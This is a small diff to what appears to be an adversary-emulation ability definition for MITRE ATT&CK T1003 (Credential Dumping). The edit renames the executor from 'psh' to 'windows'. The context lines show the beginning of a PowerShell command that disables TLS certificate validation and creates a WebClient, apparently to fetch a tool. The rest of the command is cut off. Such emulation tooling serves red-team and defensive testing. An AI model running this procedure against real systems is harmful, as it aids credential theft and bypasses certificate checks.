@@ -8,7 +8,7 @@
     attack_id: T1003
     name: Credential Dumping
   executors:
-    psh:
+    windows:
       command: |
         [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
         $web = (New-Object System.Net.WebClient)
